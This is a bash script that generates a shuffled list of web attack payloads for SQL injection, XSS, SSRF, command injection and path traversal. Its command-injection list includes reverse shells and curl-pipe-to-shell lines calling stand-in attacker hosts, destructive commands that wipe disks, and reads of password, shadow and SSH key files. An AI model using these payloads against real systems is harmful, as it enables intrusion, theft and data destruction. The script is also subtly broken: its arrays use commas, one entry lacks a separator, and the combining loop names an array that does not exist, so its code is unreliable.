#!/bin/bash

OUTPUT_FILE="attack_payloads.txt"
> "$OUTPUT_FILE"

# Function to append array with tag
append_payloads() {
  local tag=$1
  shift
  for payload in "$@"; do
    echo "$payload" >> "$OUTPUT_FILE"
  done
}

# Extended payloads

# --- SQL Injection (40+)
sqli_payloads=(
    "' OR 1=1 --", "' OR 'a'='a", "' OR 1=1#", "\" OR 1=1--", "' OR ''='", "'=' OR 1=1--", "'--",
    "'; DROP TABLE users; --", "' UNION SELECT NULL, version()--", "' OR sleep(5)--",
    "' AND 1=(SELECT COUNT(*) FROM users);--", "' or 1=1 limit 1; --", "' or 1=convert(int,'a') --",
    "' AND EXISTS(SELECT * FROM users)--", "'; EXEC xp_cmdshell('whoami'); --",
    "' AND 1=CAST((SELECT @@version) AS INT);--", "' OR updatexml(1,concat(0x7e,user()),0)--",
    "' AND 1=UTL_INADDR.get_host_name('127.0.0.1')--", "' OR 1 GROUP BY CONCAT(username,password) --",
    "' or benchmark(1000000,MD5(1))--", "' and ascii(substr(database(),1,1))=100 --",
    "' and (select count(*) from tab)=1 --", "' or exists(select * from users) --",
    "' and 1 in (select min(username) from users) --", "'; waitfor delay '0:0:5' --",
    "' or true--", "' or false--", "admin'--", "admin' or '1'='1", "' or '1'='1'--", "' or 'x'='x",
    "1' or sleep(5)--", "1' or 1=1#", "1';shutdown--", "';select pg_sleep(10)--", "';select 1 where 1=1--",
    "1 AND (SELECT SUBSTRING(@@version,1,1))='5'", "'||(SELECT user FROM dual)--",
    "' OR '' = '", "' OR 1=1 LIMIT 1 OFFSET 1 --", "' OR 1=1;#", "' AND 1=0 UNION ALL SELECT NULL--"
)

# --- XSS (40+)
xss_payloads=(
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert('xss')>"
    "\"><script>alert(document.cookie)</script>", "<iframe src=javascript:alert(1)>",
    "'><body onload=alert(1)>", "<marquee><h1>XSS</h1></marquee>", "<link rel=stylesheet href=javascript:alert(1)>",
    "<object data=javascript:alert(1)>", "<embed src=javascript:alert(1)>", "<details open ontoggle=alert(1)>",
    "<a href='javascript:alert(1)'>click</a>", "<img src='x' onerror='alert(\"XSS\")'>", "<base href='javascript:alert(1)//'>",
    "<video><source onerror=\"alert(1)\">", "<input autofocus onfocus=alert(1)>",
    "<form onsubmit=alert(1)><input type=submit>", "<isindex prompt='><script>alert(1)</script>'>", 
    "<script src=data:text/javascript,alert(1)></script>", "<img src=\`~\` onerror=alert(1)>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "><script>alert(1337)</script>", "<b onmouseover=alert(1)>X</b>",
    "<math><mtext></mtext><mo></mo><mi>x</mi><malignmark></malignmark></math><script>alert(1)</script>",
    "<img src=x:alert(1)>", "<style>@keyframes x{}</style><div style='animation-name:x' onanimationstart='alert(1)'>",
    "<a href=javascript&colon;alert(1)>click</a>", "javascript:alert(1)", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E", "'';!--\"<XSS>=&{()}", "<script/src='//xss.rocks/xss.js'>",
    "<!--<img src=-- onerror=alert(1)>-->", "<style>body{background:url(javascript:alert(1))}</style>",
    "<meta charset='x' /><script>alert(1)</script>", "<button onclick=alert(1)>X</button>",
    "<img src='' onerror='eval(\"alert(1)\")'>", "<input onblur=alert(1) autofocus>", "<img onerror=confirm(1) src=x>"
)

# --- SSRF (40+)
ssrf_payloads=(
    "http://127.0.0.1:80", "http://localhost:8080", "http://169.254.169.254/latest/meta-data/",
    "http://internal.service.local/", "file:///etc/passwd", "ftp://127.0.0.1/", "http://0.0.0.0:8000",
    "http://127.0.0.1:9000/.git", "http://admin:admin@127.0.0.1/", "http://localhost:11211/stats",
    "gopher://127.0.0.1:11211/_stats", "http://localhost/secret", "http://0x7f000001/",
    "http://[::1]/", "http://localhost/?url=http://evil.com", "http://evil.com/redirect?target=127.0.0.1",
    "http://localhost:80/admin", "http://127.1/", "http://192.168.0.1:8080", "http://internal-api/",
    "http://localhost:8000/.git/config", "http://127.0.0.1/cgi-bin/test.cgi", "file:///windows/win.ini",
    "file://c:/windows/system32/drivers/etc/hosts", "http://localhost/.aws/credentials",
    "http://localhost/.env", "http://localhost:3000/api", "http://127.0.0.1:6379/",
    "http://127.0.0.1:22", "http://127.0.0.1:3306", "http://127.0.0.1:5000/debug", "http://127.0.0.1:5601",
    "http://127.0.0.1:8081/", "http://127.0.0.1/admin/api", "http://internal.corp/api",
    "http://192.168.1.1/api", "http://10.0.0.1/api", "http://(::ffff:127.0.0.1]/", "http://2130706433"
)

# --- RCE (40+)
rce_payloads=(
    "\`id\`", "\$(id)", "; whoami", "& cat /etc/passwd", "| ls -la", "|| sleep 10", "&& curl evil.com",
    "; nc attacker.com 1337 -e /bin/bash", "\`wget http://malicious.site\`", "\$(python -c 'import os;os.system(\"id\")')",
    "\$(bash -i >& /dev/tcp/evil.com/1234 0>&1)", "\`perl -e 'exec \"id\"'\`", "; php -r 'system(\"id\");'",
    "\`rm -rf /\`", "\`echo hello\`", "\`cat /etc/shadow\`", "\$(ping -c 1 attacker.com)",
    "\`curl -s http://evil.com/shell.sh | sh\`", "\`touch /tmp/hacked\`", "\`env\`",
    "\`whoami\`", "\`uname -a\`", "\`ls /root/\`", "\`nc -e /bin/sh attacker.com 4444\`",
    "\`scp file user@attacker:/tmp\`", "\`python3 -m http.server\`", "\`dd if=/dev/zero of=/dev/sda\`",
    "\`shutdown -h now\`", "\`reboot\`", "\`eval ls\`", "\`python3 -c 'import os;os.system(\"id\")'\`",
    "\`exec ls\`", "\`perl -e 'print qx/id/'\`", "\`echo vulnerable\`", "\`touch hacked.txt\`",
    "\`mkfifo /tmp/x; nc attacker.com 4444 < /tmp/x | /bin/sh > /tmp/x\`", "\`id; uname -a\`",
    "\`system('id')\`"
)

# --- Path Traversal (40+)
path_traversal_payloads=(
    "../../etc/passwd", "..\\..\\boot.ini", "../../../windows/system32/drivers/etc/hosts",
    "../../../../../../etc/shadow", "%2e%2e%2fetc/passwd", "..%c0%af../etc/passwd",
    "..%255c..%255c..%255cwindows\\win.ini", "../.git/config", "/etc/passwd%00", "..%00/etc/passwd",
    "/../../../../etc/passwd", "..%2f..%2fetc%2fpasswd", "....//....//etc/passwd",
    "..%252fetc%252fpasswd", "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "..%5c..%5cwindows\\win.ini",
    "../config.php~", "../../boot.ini", "/../../../../windows/win.ini", "..\\AppData\\Local\\Temp",
    "../.env", "../../.bash_history", "../../../.ssh/id_rsa", "../../../../../../boot.ini",
    "../../../../../../.env", "../../../../../../.git/config", "../../../etc/shadow",
    "../../../etc/group", "../web.config", "../../../../../../config.yaml",
    "../../../../../usr/local/apache2/conf/httpd.conf", "../../../etc/hosts",
    "../../../../../var/log/syslog", "../../../../../../../etc/motd",
    "../../../../../../../etc/init.d/ssh", "../../../windows/win.ini", "../../..%2f..%2fetc%2fpasswd",
    "../../../etc/config", "../../../../../../etc/my.cnf"
)

# Combine all (ensure at least 500 lines total)
for i in {1..50}; do
  for payload in "${sqli_payloads[@]}" "${xss_payloads[@]}" "${ssrf_payloads[@]}" "${rce_payloads[@]}" "${traversal_payloads[@]}"; do
    echo "$payload" >> "$OUTPUT_FILE"
  done
  [[ $(wc -l < "$OUTPUT_FILE") -ge 500 ]] && break
done

# Shuffle file
shuf "$OUTPUT_FILE" -o "$OUTPUT_FILE"

echo "✅ Generated $(wc -l < "$OUTPUT_FILE") attack payloads → $OUTPUT_FILE"